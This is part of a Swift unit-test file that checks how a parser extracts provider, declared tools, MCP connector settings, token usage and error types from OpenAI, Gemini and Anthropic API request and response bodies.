        XCTAssertEqual(facts.stopReason, "tool_use")
    }

    func testOpenAIResponsesMCPToolAndListedTools() throws {
        let request = #"{"model":"gpt-x","input":[],"tools":[{"type":"mcp","server_label":"stripe","server_url":"https://mcp.stripe.com","require_approval":"never","allowed_tools":["create_refund"]},{"type":"function","name":"shell","description":"Run"},{"type":"web_search"}]}"#
        let response = #"{"object":"response","output":[{"type":"mcp_list_tools","server_label":"stripe","tools":[{"name":"create_refund"},{"name":"list_charges"}]}],"usage":{"input_tokens":500,"output_tokens":42,"input_tokens_details":{"cached_tokens":400},"output_tokens_details":{"reasoning_tokens":30}}}"#
        let facts = try XCTUnwrap(LLMFactsReader.facts(request: Data(request.utf8), response: Data(response.utf8), host: "api.openai.com"))
        XCTAssertEqual(facts.provider, .openAIResponses)
        let stripe = try XCTUnwrap(facts.connectors.first)
        XCTAssertEqual(stripe.approval, "never")
        XCTAssertEqual(stripe.allowedTools, ["create_refund"])
        XCTAssertEqual(stripe.tools, ["create_refund", "list_charges"], "tools the provider reported")
        XCTAssertEqual(facts.declaredTools.first { $0.kind == .provider }?.name, "web_search")
        XCTAssertEqual(facts.usage?.cacheRead, 400)
        XCTAssertEqual(facts.usage?.reasoning, 30)
    }

    func testChatCompletionsAndGemini() throws {
        let chat = #"{"model":"gpt-4.1","messages":[],"tools":[{"type":"function","function":{"name":"get_weather","description":"Weather"}}]}"#
        let chatResponse = #"{"choices":[],"usage":{"prompt_tokens":100,"completion_tokens":20,"prompt_tokens_details":{"cached_tokens":64}}}"#
        let chatFacts = try XCTUnwrap(LLMFactsReader.facts(request: Data(chat.utf8), response: Data(chatResponse.utf8), host: "api.openai.com"))
        XCTAssertEqual(chatFacts.provider, .openAIChat)
        XCTAssertEqual(chatFacts.declaredTools.map(\.name), ["get_weather"])
        XCTAssertEqual(chatFacts.usage, TokenUsage(input: 100, output: 20, cacheRead: 64, cacheWrite: 0, reasoning: 0))

        // Gemini REST is camelCase; snake_case is accepted too.
        let gemini = #"{"contents":[],"tools":[{"functionDeclarations":[{"name":"run_shell_command","description":"Run"}]},{"googleSearch":{}},{"codeExecution":{}}]}"#
        let geminiResponse = #"{"candidates":[],"usageMetadata":{"promptTokenCount":900,"candidatesTokenCount":80,"cachedContentTokenCount":128,"thoughtsTokenCount":40}}"#
        let facts = try XCTUnwrap(LLMFactsReader.facts(request: Data(gemini.utf8), response: Data(geminiResponse.utf8), host: "generativelanguage.googleapis.com"))
        XCTAssertEqual(facts.provider, .gemini)
        XCTAssertEqual(facts.declaredTools.map(\.name), ["run_shell_command", "google_search", "code_execution"])
        XCTAssertEqual(facts.usage, TokenUsage(input: 900, output: 80, cacheRead: 128, cacheWrite: 0, reasoning: 40))
    }

    func testErrorsAndNonLLMBodies() throws {
        let failed = LLMFactsReader.facts(request: Data(#"{"model":"m","messages":[],"system":"s"}"#.utf8),
                                          response: Data(#"{"type":"error","error":{"type":"rate_limit_error","message":"slow down"}}"#.utf8),
                                          host: "api.anthropic.com")
        XCTAssertEqual(failed?.errorType, "rate_limit_error")
        XCTAssertNil(LLMFactsReader.facts(request: Data(#"{"jsonrpc":"2.0","method":"tools/list"}"#.utf8), response: Data(), host: "mcp.example"))
        XCTAssertNil(LLMFactsReader.facts(request: Data("not json".utf8), response: Data(), host: "example.com"))
    }

    func testProviderRunMCPResultsFromAnthropicResponse() {
        let body = #"{"role":"assistant","content":[{"type":"mcp_tool_use","id":"mcptoolu_1","name":"echo","server_name":"example-mcp","input":{}},{"type":"mcp_tool_result","tool_use_id":"mcptoolu_1","is_error":false,"content":[{"type":"text","text":"Hello"}]}]}"#
        let results = ToolResultReader.results(inResponse: Data(body.utf8))
        XCTAssertEqual(results.first?.callID, "mcptoolu_1")
        XCTAssertEqual(results.first?.output, "Hello")
    }
}
